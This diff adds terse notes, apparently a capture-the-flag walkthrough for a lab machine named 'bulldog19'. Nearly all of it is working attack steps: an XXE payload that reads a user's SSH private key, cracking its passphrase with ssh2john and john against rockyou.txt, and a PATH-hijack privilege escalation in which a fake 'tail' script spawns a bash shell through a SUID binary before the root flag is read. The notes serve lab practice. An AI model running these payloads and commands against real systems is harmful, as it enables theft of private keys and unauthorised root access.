@@ -1,0 +1,25 @@
+bulldog19 (mdp pdf)
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///home/<user>/.ssh/id_rsa">]>
+<comment>
+  <name>&ent;</name>
+  <author> </author>
+  <com> </com>
+</comment>
+/bin/python3 john/run/ssh2john.py id_rsa > hash
+
+john hash --wordlist=rockyou.txt
+
+perm clé ssh : chmod 600 id_rsa
+
+export PATH=/tmp:$PATH
+nano tail
+#!/usr/bin/python3
+
+import os 
+
+os.system("/bin/bash")
+chmod +x tail
+/home/joe/live_log
+id
+cat /root/root.txt
